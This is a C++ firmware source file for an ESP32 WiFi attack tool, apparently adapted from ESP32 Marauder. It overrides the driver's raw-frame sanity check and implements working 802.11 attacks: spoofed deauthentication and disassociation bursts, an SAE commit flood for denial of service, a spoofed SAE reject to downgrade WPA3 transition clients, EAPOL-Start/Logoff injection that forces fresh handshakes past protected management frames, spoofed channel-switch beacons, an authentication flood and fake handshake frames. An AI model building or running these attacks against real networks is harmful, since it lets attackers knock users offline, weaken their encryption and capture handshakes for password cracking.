// WSL Bypasser - bypass ESP32 WiFi frame validation for raw TX
// Hamlet flavor: MAC randomization + association requests + deauth
//
// Based on ESP32 Marauder using -zmuldefs linker flag
// We override ieee80211_raw_frame_sanity_check() so raw frames pass
#include "wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_random.h>
#include "../util/debug_log.h"
#include <Arduino.h>  // Serial for TX diagnostics

extern "C" {

// Override sanity check; -zmuldefs makes this beat libnet80211.a
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    // always allow
    return 0;
}

}

namespace WSLBypasser {

static bool initialized = false;

// ==[ CENTRAL TX ]== all raw frame TX goes through here for diagnostics + interface selection.
// Tracks ok/fail counts and the last error code so we can diagnose from Serial.
static uint32_t txOkCount = 0;
static uint32_t txFailCount = 0;
static esp_err_t txLastErr = ESP_OK;

static inline esp_err_t rawTx(const void* buf, int len) {
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    // Retry up to 5× on NO_MEM with escalating backoff — TX buffer needs time to drain
    if (rc == ESP_ERR_NO_MEM) {
        for (int retry = 0; retry < 5 && rc == ESP_ERR_NO_MEM; retry++) {
            delayMicroseconds(500 + retry * 300);  // 500/800/1100/1400/1700µs escalating
            rc = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
        }
    }
    if (rc == ESP_OK) {
        txOkCount++;
    } else {
        txFailCount++;
        txLastErr = rc;
    }
    return rc;
}

void init() {
    if (initialized) return;

    initialized = true;
}

void randomizeMAC() {
    uint8_t mac[6];

    // generate random MAC using hardware RNG
    esp_fill_random(mac, 6);

    // set locally administered bit, clear multicast
    mac[0] = (mac[0] & 0xFC) | 0x02;

    // apply the new MAC
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, mac);
    (void)result;  // Silence unused warning
}

bool sendAuthentication(const uint8_t* bssid) {
    // Open System Authentication, seq 1 — AP must auth before assoc
    uint8_t f[30] = {};
    f[0] = 0xB0;                        // Authentication
    memcpy(f + 4, bssid, 6);            // Dst: AP
    esp_wifi_get_mac(WIFI_IF_STA, f + 10); // Src: us (direct into frame)
    memcpy(f + 16, bssid, 6);           // BSSID
    f[26] = 0x01;                        // Auth Seq: 1
    return rawTx(f, 30) == ESP_OK;
}

// ==[ ASSOC STATIC IEs ]== rates + RSN are constant. 30 bytes total.
static const uint8_t assocIETail[] = {
    // Supported Rates IE (10 bytes)
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
    // RSN IE — WPA2-PSK CCMP (22 bytes: 2 header + 20 body)
    0x30, 0x14,                                     // Element ID: RSN, Length: 20
    0x01, 0x00,                                     // RSN Version 1
    0x00, 0x0F, 0xAC, 0x04,                         // Group Cipher: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,             // Pairwise: 1× CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,             // AKM: 1× PSK
    0x00, 0x00                                       // RSN Capabilities
};

bool sendAssociationRequest(const uint8_t* bssid, const char* ssid) {
    uint8_t frame[128];  // max: 24 hdr + 4 fixed + 2+32 ssid + 30 IEs = 92

    // get our current MAC
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);

    // ==[ 802.11 HEADER ]== 24 bytes
    uint16_t len = 0;
    frame[len++] = 0x00; frame[len++] = 0x00;  // FC: assoc request
    frame[len++] = 0x00; frame[len++] = 0x00;  // Duration
    memcpy(frame + len, bssid, 6);  len += 6;  // Dst: AP
    memcpy(frame + len, ourMac, 6); len += 6;  // Src: us
    memcpy(frame + len, bssid, 6);  len += 6;  // BSSID
    frame[len++] = 0x00; frame[len++] = 0x00;  // Seq (hw fills)

    // ==[ FIXED PARAMS ]== 4 bytes
    frame[len++] = 0x11; frame[len++] = 0x00;  // Capability: ESS + Privacy
    frame[len++] = 0x0A; frame[len++] = 0x00;  // Listen Interval

    // ==[ SSID IE ]== variable
    frame[len++] = 0x00;  // Element ID: SSID
    uint8_t sl = strlen(ssid);
    if (sl > 32) sl = 32;
    frame[len++] = sl;
    memcpy(frame + len, ssid, sl); len += sl;

    // ==[ STATIC IEs ]== rates + RSN (30 bytes, pre-built)
    memcpy(frame + len, assocIETail, sizeof(assocIETail));
    len += sizeof(assocIETail);

    return rawTx(frame, len) == ESP_OK;
}

// ==[ MGMT FRAME TEMPLATE ]== 26-byte deauth/disassoc. build once, stamp per-TX.
// offsets: [0]=subtype, [4-9]=addr1(dst), [10-15]=addr2(src), [16-21]=addr3(bssid), [24]=reason
static const uint8_t reasons[] = {7, 1, 4, 5, 6};

// stamp and TX a 26-byte mgmt frame. caller pre-fills addrs, we set subtype+reason+TX.
static inline void txMgmt(uint8_t* f, uint8_t subtype, uint8_t reason) {
    f[0] = subtype;
    f[24] = reason;
    rawTx(f, 26);
}

bool sendDeauth(const uint8_t* bssid, const uint8_t* client, uint8_t reason) {
    uint8_t f[26] = {};
    memcpy(f + 4, client, 6);   // dst
    memcpy(f + 10, bssid, 6);   // src (spoofed AP)
    memcpy(f + 16, bssid, 6);   // bssid
    txMgmt(f, 0xC0, reason);    // deauth
    return true;  // fire-and-forget; esp_wifi_80211_tx rarely fails
}

void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client, uint8_t count, uint16_t jitterMs) {
    // build template once — AP→client direction, BSSID in addr3
    uint8_t f[26] = {};
    memcpy(f + 4, client, 6);   // addr1: dst = client
    memcpy(f + 10, bssid, 6);   // addr2: src = AP (spoofed)
    memcpy(f + 16, bssid, 6);   // addr3: bssid

    for (uint8_t i = 0; i < count; i++) {
        uint8_t r = reasons[i % 5];
        txMgmt(f, 0xC0, r);     // deauth AP→client
        delayMicroseconds(800);  // pace between deauth+disassoc pair
        txMgmt(f, 0xA0, r);     // disassoc AP→client
        if (i + 1 < count) delayMicroseconds(1000);  // pace: let TX buffer drain between rounds
    }
}

void sendBidirectionalDeauthBurst(const uint8_t* bssid, const uint8_t* client, uint8_t count, uint16_t jitterMs) {
    // ==[ TWO TEMPLATES ]== AP→client and client→AP. build once, reuse N times.
    // template 1: AP → client (addr1=client, addr2=bssid)
    uint8_t ap2cl[26] = {};
    memcpy(ap2cl + 4, client, 6);
    memcpy(ap2cl + 10, bssid, 6);
    memcpy(ap2cl + 16, bssid, 6);

    // template 2: client → AP (addr1=bssid, addr2=client) — spoofed
    uint8_t cl2ap[26] = {};
    memcpy(cl2ap + 4, bssid, 6);
    memcpy(cl2ap + 10, client, 6);
    memcpy(cl2ap + 16, bssid, 6);

    for (uint8_t i = 0; i < count; i++) {
        uint8_t r = reasons[i % 5];
        txMgmt(ap2cl, 0xC0, r);  // deauth  AP → client
        delayMicroseconds(600);
        txMgmt(cl2ap, 0xC0, r);  // deauth  client → AP (spoofed)
        delayMicroseconds(600);
        txMgmt(ap2cl, 0xA0, r);  // disassoc AP → client
        delayMicroseconds(600);
        txMgmt(cl2ap, 0xA0, r);  // disassoc client → AP (spoofed)
        if (i + 1 < count) delayMicroseconds(1000);  // pace: 4 frames then breathe
    }
}

// ==[ PROBE REQ TAIL ]== wildcard SSID + supported rates (12 bytes, constant)
static const uint8_t probeReqTail[] = {
    0x00, 0x00,                                     // SSID IE: wildcard (id=0, len=0)
    0x01, 0x08,                                     // Supported Rates IE
    0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
};

bool sendProbeRequest(const uint8_t* bssid) {
    uint8_t f[38] = {};  // 24 hdr + 2 wildcard SSID + 10 rates = 36, pad to 38
    f[0] = 0x40;                             // Probe Request
    memcpy(f + 4, bssid, 6);                 // Dst: target AP
    esp_wifi_get_mac(WIFI_IF_STA, f + 10);   // Src: us (direct into frame)
    memcpy(f + 16, bssid, 6);                // BSSID
    memcpy(f + 24, probeReqTail, 12);        // IEs
    return rawTx(f, 36) == ESP_OK;
}

// ==[ C5MONSTER ]== SAE Authentication Commit frame
// Forces AP into expensive ECC point validation (~10-50ms per frame)
// Random MAC per frame dodges per-STA rate limiting
//
// NOTE: C5Monster flood (sendSAEFlood) is intentionally DISABLED in hunt.cpp
// target selection — pure DoS with P(capture) = 0. The SAE downgrade path
// (sendSAEReject) remains active for WPA2/WPA3 transition networks.
// See hunt.cpp:916 and hunt.cpp:3681-3682 for removal rationale.
bool sendSAECommit(const uint8_t* bssid) {
    uint8_t f[128] = {};
    f[0] = 0xB0;                        // Auth frame
    memcpy(f + 4, bssid, 6);            // Addr1: AP
    memcpy(f + 16, bssid, 6);           // Addr3: BSSID
    f[24] = 0x03;                        // Auth Algo: SAE
    f[26] = 0x01;                        // Auth Seq: Commit
    f[30] = 0x13;                        // Group ID: 19 (P-256)

    // random MAC + scalar + element (102 bytes of entropy)
    esp_fill_random(f + 10, 6);          // Addr2: spoofed client
    f[10] = (f[10] & 0xFC) | 0x02;
    esp_fill_random(f + 32, 96);         // scalar (32) + element (64)

    return rawTx(f, 128) == ESP_OK;
}

void sendSAEFlood(const uint8_t* bssid, uint8_t count, uint16_t jitterMs) {
    // build template once — only random bytes change per frame
    uint8_t f[128] = {};
    f[0] = 0xB0;
    memcpy(f + 4, bssid, 6);
    memcpy(f + 16, bssid, 6);
    f[24] = 0x03;
    f[26] = 0x01;
    f[30] = 0x13;

    for (uint8_t i = 0; i < count; i++) {
        esp_fill_random(f + 10, 6);      // random MAC
        f[10] = (f[10] & 0xFC) | 0x02;
        esp_fill_random(f + 32, 96);     // random scalar + element
        rawTx(f, 128);
        if (i + 1 < count) delayMicroseconds(500);
    }
}

// ==[ SAE DOWNGRADE ]== Spoofed Auth reject: AP tells client "SAE failed"
// Client retries a few times, then supplicant falls back to WPA2-PSK on transition networks
// Status 1 (unspecified failure) is generic enough that most supplicants don't retry SAE forever
bool sendSAEReject(const uint8_t* bssid, const uint8_t* client, uint8_t authSeq) {
    uint8_t f[30] = {};
    f[0] = 0xB0;                        // Authentication
    memcpy(f + 4, client, 6);           // Dst: client
    memcpy(f + 10, bssid, 6);           // Src: AP (spoofed)
    memcpy(f + 16, bssid, 6);           // BSSID
    f[24] = 0x03;                        // Auth Algo: SAE
    f[26] = authSeq;                     // Auth Seq (match rejected frame)
    f[28] = 0x01;                        // Status: Unspecified Failure
    return rawTx(f, 30) == ESP_OK;
}

// ==[ PMF BYPASS ]== EAPOL data frames: 802.11w can't touch this.
// spoofed client→AP. AP restarts 802.1X auth → fresh 4-way handshake.
// LLC/SNAP + EAPOL tail is constant — embed as static blob.
static const uint8_t eapolTail[] = {
    0x00, 0x00,                                     // seq ctrl (hw fills)
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E, // LLC/SNAP 802.1X
    0x01,                                            // EAPOL version 1
    0x00,                                            // type placeholder [idx 33 in frame]
    0x00, 0x00                                       // length 0
};

bool sendEAPOLStart(const uint8_t* bssid, const uint8_t* clientMac) {
    // build once, TX once. 36 bytes total.
    uint8_t f[36];
    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;  // Data, ToDS=1
    memcpy(f + 4, bssid, 6);       // addr1: AP
    memcpy(f + 10, clientMac, 6);  // addr2: spoofed client
    memcpy(f + 16, bssid, 6);      // addr3: BSSID
    memcpy(f + 22, eapolTail, 14); // seq + LLC/SNAP + EAPOL header
    f[33] = 0x01;                  // EAPOL-Start
    return rawTx(f, 36) == ESP_OK;
}

bool sendEAPOLLogoff(const uint8_t* bssid, const uint8_t* clientMac) {
    uint8_t f[36];
    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;
    memcpy(f + 4, bssid, 6);
    memcpy(f + 10, clientMac, 6);
    memcpy(f + 16, bssid, 6);
    memcpy(f + 22, eapolTail, 14);
    f[33] = 0x02;                  // EAPOL-Logoff
    return rawTx(f, 36) == ESP_OK;
}

// ==[ CSA HERD ]== spoofed beacon from target AP with Channel Switch Announcement.
// clients honor CSA and migrate to targetChannel.
bool sendCSABeacon(const uint8_t* bssid, const char* ssid,
                   uint8_t currentChan, uint8_t targetChannel, uint8_t switchCount) {
    uint8_t frame[128] = {0};
    uint16_t len = 0;

    // Frame Control: Beacon (subtype 0x08)
    frame[len++] = 0x80;
    frame[len++] = 0x00;
    // Duration
    frame[len++] = 0x00;
    frame[len++] = 0x00;
    // Addr1: Broadcast
    memset(frame + len, 0xFF, 6); len += 6;
    // Addr2: Source = target BSSID (spoof as the real AP)
    memcpy(frame + len, bssid, 6); len += 6;
    // Addr3: BSSID
    memcpy(frame + len, bssid, 6); len += 6;
    // Sequence Control
    frame[len++] = 0x00;
    frame[len++] = 0x00;

    // ==[ FIXED PARAMS ]== (12 bytes)
    // Timestamp (8 bytes) — already zero from = {0} init
    len += 8;
    // Beacon Interval (2 bytes) - 100 TU
    frame[len++] = 0x64; frame[len++] = 0x00;
    // Capability Info (2 bytes) - ESS + Privacy + Short Preamble
    frame[len++] = 0x31; frame[len++] = 0x00;

    // ==[ INFORMATION ELEMENTS ]==

    // SSID IE
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    frame[len++] = 0x00;  // Element ID: SSID
    frame[len++] = ssidLen;
    memcpy(frame + len, ssid, ssidLen); len += ssidLen;

    // Supported Rates IE
    frame[len++] = 0x01; frame[len++] = 0x08;
    frame[len++] = 0x82; frame[len++] = 0x84; frame[len++] = 0x8B; frame[len++] = 0x96;
    frame[len++] = 0x0C; frame[len++] = 0x12; frame[len++] = 0x18; frame[len++] = 0x24;

    // DS Parameter Set IE (current channel — before switch)
    frame[len++] = 0x03; frame[len++] = 0x01; frame[len++] = currentChan;

    // ==[ CSA IE ]== Channel Switch Announcement
    frame[len++] = 0x25;  // Element ID: 37
    frame[len++] = 0x03;  // Length: 3
    frame[len++] = 0x01;  // Channel Switch Mode: 1 (stop transmitting until switch)
    frame[len++] = targetChannel;
    frame[len++] = switchCount;

    return rawTx(frame, len) == ESP_OK;
}

// ==[ AUTH FLOOD ]== random-MAC auth frames. fills AP STA table.
bool sendAuthFlood(const uint8_t* bssid, uint8_t count, uint16_t jitterMs) {
    // build template once — only addr2 (src MAC) changes per frame
    uint8_t f[30] = {};
    f[0] = 0xB0;                       // Authentication
    memcpy(f + 4, bssid, 6);           // Dst: AP
    memcpy(f + 16, bssid, 6);          // BSSID
    f[26] = 0x01;                      // Auth Seq: 1

    for (uint8_t i = 0; i < count; i++) {
        esp_fill_random(f + 10, 6);    // Src: random MAC (in-place)
        f[10] = (f[10] & 0xFC) | 0x02; // locally administered, unicast
        rawTx(f, 30);
        if (i + 1 < count) delayMicroseconds(500);
    }
    return true;
}

// ==[ HOGWASH ]== fake EAPOL 4-way handshake frames.
// M1: AP→STA (FromDS=1). M2: STA→AP (ToDS=1).
// EAPOL-Key layout per IEEE 802.11i / 802.1X-2004:
//   [0] ver  [1] type(0x03)  [2-3] bodyLen(BE)
//   [4] descriptor(0x02=RSN)  [5-6] keyInfo(BE)  [7-8] keyLen(BE)
//   [9-16] replayCounter(BE)  [17-48] nonce(32)  [49-64] keyIV(16)
//   [65-72] rsc(8)  [73-76] reserved(4)  [77-92] mic(16)  [93-94] keyDataLen(BE)

static void buildEAPOLDataFrame(uint8_t* f, bool fromDS,
                                 const uint8_t* bssid, const uint8_t* sta) {
    // 802.11 Data header (24 bytes)
    f[0] = 0x08;                       // Data frame
    f[1] = fromDS ? 0x02 : 0x01;      // FromDS=1 (AP→STA) or ToDS=1 (STA→AP)
    f[2] = 0x00; f[3] = 0x00;         // duration
    if (fromDS) {
        memcpy(f + 4, sta, 6);        // addr1: receiver = STA
        memcpy(f + 10, bssid, 6);     // addr2: transmitter = AP
    } else {
        memcpy(f + 4, bssid, 6);      // addr1: receiver = AP
        memcpy(f + 10, sta, 6);       // addr2: transmitter = STA
    }
    memcpy(f + 16, bssid, 6);         // addr3: BSSID
    f[22] = 0x00; f[23] = 0x00;       // seq ctrl

    // LLC/SNAP (8 bytes at offset 24)
    f[24] = 0xAA; f[25] = 0xAA; f[26] = 0x03;
    f[27] = 0x00; f[28] = 0x00; f[29] = 0x00;
    f[30] = 0x88; f[31] = 0x8E;       // EtherType: 802.1X
}

// EAPOL body starts at frame offset 32
static constexpr uint8_t EAPOL_OFF = 32;

bool sendFakeEAPOLM1(const uint8_t* bssid, const uint8_t* fakeSta,
                     const uint8_t* anonce, uint64_t replayCounter) {
    // M1: 24(hdr) + 8(llc) + 4(eapol hdr) + 95(eapol-key body) = 131 bytes
    uint8_t f[132] = {};
    buildEAPOLDataFrame(f, true, bssid, fakeSta);  // FromDS=1: AP→STA

    uint8_t* e = f + EAPOL_OFF;
    e[0] = 0x02;                       // EAPOL version 2
    e[1] = 0x03;                       // type: EAPOL-Key
    e[2] = 0x00; e[3] = 0x5F;         // body length: 95 (big-endian)
    e[4] = 0x02;                       // descriptor type: RSN (WPA2)
    e[5] = 0x00; e[6] = 0x8A;         // Key Info: ACK=1, Pairwise=1, KeyDescVer=2 (SHA1-AES)
    e[7] = 0x00; e[8] = 0x10;         // Key Length: 16 (CCMP)
    // replay counter (big-endian 8 bytes at e+9)
    for (int i = 7; i >= 0; i--) e[9 + (7 - i)] = (replayCounter >> (i * 8)) & 0xFF;
    // ANonce (32 bytes at e+17)
    memcpy(e + 17, anonce, 32);
    // keyIV(16), rsc(8), reserved(4), mic(16), keyDataLen(2) = all zeros (already from = {})

    return rawTx(f, 131) == ESP_OK;
}

bool sendFakeEAPOLM2(const uint8_t* bssid, const uint8_t* fakeSta,
                     const uint8_t* snonce, const uint8_t* fakeMic,
                     uint64_t replayCounter) {
    // M2: 24(hdr) + 8(llc) + 4(eapol hdr) + 115(eapol-key + 20B RSN IE) = 151 bytes
    uint8_t f[152] = {};
    buildEAPOLDataFrame(f, false, bssid, fakeSta);  // ToDS=1: STA→AP

    uint8_t* e = f + EAPOL_OFF;
    e[0] = 0x02;                       // EAPOL version 2
    e[1] = 0x03;                       // type: EAPOL-Key
    e[2] = 0x00; e[3] = 0x73;         // body length: 115 (95 + 20 key data)
    e[4] = 0x02;                       // descriptor type: RSN
    e[5] = 0x01; e[6] = 0x0A;         // Key Info: MIC=1, Pairwise=1, KeyDescVer=2
    e[7] = 0x00; e[8] = 0x10;         // Key Length: 16
    // replay counter (same as M1 — must match)
    for (int i = 7; i >= 0; i--) e[9 + (7 - i)] = (replayCounter >> (i * 8)) & 0xFF;
    // SNonce (32 bytes at e+17)
    memcpy(e + 17, snonce, 32);
    // MIC (16 bytes at e+77) — random garbage, the whole point of HOGWASH
    memcpy(e + 77, fakeMic, 16);
    // Key Data Length (2 bytes at e+93): 20 (RSN IE)
    e[93] = 0x00; e[94] = 0x14;
    // Key Data: minimal RSN IE (WPA2-PSK CCMP)
    static const uint8_t rsnIE[] = {
        0x30,                          // Element ID: RSN
        0x12,                          // Length: 18
        0x01, 0x00,                    // Version: 1
        0x00, 0x0F, 0xAC, 0x04,       // Group Cipher: CCMP
        0x01, 0x00,                    // Pairwise Count: 1
        0x00, 0x0F, 0xAC, 0x04,       // Pairwise Cipher: CCMP
        0x01, 0x00,                    // AKM Count: 1
        0x00, 0x0F, 0xAC, 0x02,       // AKM: PSK
    };
    memcpy(e + 95, rsnIE, 20);

    return rawTx(f, 151) == ESP_OK;
}

void logTxStats() {
    if (txOkCount > 0 || txFailCount > 0) {
        HAMLET_LOGF("[WSL] TX stats: ok=%u fail=%u lastErr=0x%x\n",
                      txOkCount, txFailCount, (unsigned)txLastErr);
        txOkCount = 0;
        txFailCount = 0;
    }
}

} // namespace WSLBypasser
